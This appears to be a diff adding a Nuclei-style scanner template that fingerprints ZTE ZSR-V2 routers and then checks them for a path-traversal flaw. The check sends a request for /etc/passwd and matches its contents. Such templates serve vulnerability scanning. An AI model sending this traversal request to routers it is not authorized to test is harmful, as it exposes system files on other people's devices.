@@ -1,0 +1,43 @@
+id: poc-zte-zsr-v2-router-anyfile-read
+info:
+  name: ZTE ZSR-V2 Router Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,zsr
+http:
+  - raw:
+      - |
+        GET /login.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ZSRV2"
+        part: body
+  - raw:
+      - |
+        GET /../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: regex
+        regex:
+          - "(?i)Server: ZTE"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
